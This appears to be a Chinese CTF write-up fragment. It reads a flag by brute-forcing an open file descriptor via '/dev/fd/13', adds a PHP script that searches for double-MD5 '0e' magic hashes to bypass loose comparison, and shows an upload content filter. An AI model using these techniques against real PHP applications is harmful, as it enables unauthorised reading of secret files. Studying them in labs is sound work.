这里可以利用**Linux 文件描述符** 和 **PHP 文件操作的特性**来读取文件

- 这里就需要引入一个类Unix系统中的一个特殊目录，`/dev/fd`，全称是 **"file descriptors"（文件描述符）**，它提供了一种通过文件系统路径访问进程已打开文件的方式。

  每个运行中的进程都会维护一个**文件描述符表**（file descriptor table），其中记录了该进程当前打开的所有文件（包括普通文件、管道、网络连接、终端等），每个文件对应一个非负整数（如 0、1、2 等，称为文件描述符）。

  /dev/fd 目录中会动态生成以这些文件描述符数字命名的特殊文件（如/dev/fd/0、/dev/fd/1、/dev/fd/2），通过访问这些路径，就可以间接操作进程已打开的对应文件。

  进程启动时默认打开 3 个文件描述符，对应 /dev/fd 中的固定路径：

  •/dev/fd/0：标准输入（stdin），通常对应终端的输入（如键盘）。

  •/dev/fd/1：标准输出（stdout），通常对应终端的输出（如屏幕）。

  •/dev/fd/2：标准错误（stderr），通常对应终端的错误输出。

  fopen会创建文件描述符，所以my_secret.txt会有一个文件描述符。那么就可以通过/dev/fd/*访问到

还有`php://fd/3`，这是php层面上的文件描述符

**代码中的关键行：**

```
$flag = fopen('/my_secret.txt', 'r');
```

这里打开了`/my_secret.txt`文件，然后返回一个文件句柄存储在 `$flag` 变量中，在操作系统层面，分配了一个文件描述符（比如 fd 13），`fopen` 打开的文件在脚本执行期间保持打开状态，即使代码中没有使用 `$flag` 变量，文件仍然处于打开状态，直到脚本结束或显式调用 `fclose()` 才会关闭，并且这个文件描述符是指向目标文件的

所以我们可以使用bp来爆破这个文件描述符。最后爆破得到这个数字编号为13

利用文件描述符读取`/my_secret.txt`，得到flag

```
aa__%5E%5E.php?filename=/dev/fd/13
```

```
<?php
// 查找数字，使得两次MD5后是0e开头且后面只有纯数字
echo "正在查找双重MD5为0e+纯数字的数字...\n";

$found = false;
$start_time = time();
$count = 0;

// 扩大搜索范围
for($i = 0; $i <= 1000000000000; $i++) {
    $first_md5 = md5((string)$i);
    $second_md5 = md5($first_md5);
    
    // 检查第二次MD5是否以0e开头且后面只有纯数字
    if (substr($second_md5, 0, 2) === "0e") {
        $remaining = substr($second_md5, 2);
        if (ctype_digit($remaining)) {  // 确保后面只有数字
            echo "🎉 找到啦! i = $i\n";
            echo "第一次MD5: $first_md5\n";
            echo "第二次MD5: $second_md5\n";
            
            // 验证弱类型比较
            if ($second_md5 == 0) {
                echo "弱类型比较: '$second_md5' == 0 ✓\n";
            }
            
            $found = true;
            $count++;
            
            // 保存到文件
            file_put_contents("found_values.txt", "i=$i, double_md5=$second_md5\n", FILE_APPEND);
            
            // 如果想找多个就继续，否则break
            if ($count >= 5) break;
        }
    }
    
    // 进度显示
    if ($i % 1000000 == 0) {
        echo "已搜索: $i, 找到: $count 个\n";
    }
}

if (!$found) {
    echo "在0-50000000范围内没有找到符合条件的数字\n";
} else {
    echo "总共找到: $count 个数字\n";
}

echo "搜索耗时: " . (time() - $start_time) . " 秒\n";
?>
```

```
function content_filter($tmpfile, $block_list) {
    $fh = fopen($tmpfile, "rb");
    if (!$fh) return true;
    $head = fread($fh, 4096);
    fseek($fh, -4096, SEEK_END);
    $tail = fread($fh, 4096);
    fclose($fh);
    $sample = $head . $tail;
    $lower = strtolower($sample);
    foreach ($block_list as $pat) {
        if (stripos($sample, $pat) !== false) {
            // 为避免泄露过多信息，这里不直接 echo sample（你之前有 echo，保持注释）
            return false;
        }
        if (stripos($lower, strtolower($pat)) !== false) {
            return false;
        }
    }
    return true;
}
```
